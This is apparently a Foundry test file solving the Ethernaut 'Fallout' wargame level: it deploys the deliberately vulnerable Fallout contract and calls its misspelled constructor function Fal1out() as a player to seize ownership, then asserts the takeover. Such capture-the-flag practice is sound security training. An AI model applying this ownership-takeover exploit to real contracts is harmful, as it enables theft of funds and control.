// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "src/Fallout/Fallout.sol";
contract FalloutTest is Test {
    Fallout contracts;
    address instance = address(0x1);
    address deployer = address(0x114EA4c82a0B5d54Ce5697272a2De2e4a14D654C);
    address player = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
    function setUp() public {}

    function testClaimOwnership() public {
        vm.startPrank(deployer);
        contracts = new Fallout();
        vm.stopPrank();

        assertEq(contracts.owner(), address(0));
        
        vm.startPrank(player);
        contracts.Fal1out();
        vm.stopPrank();

        emit log_address(contracts.owner());
        assertEq(contracts.owner(), player);
    }
}
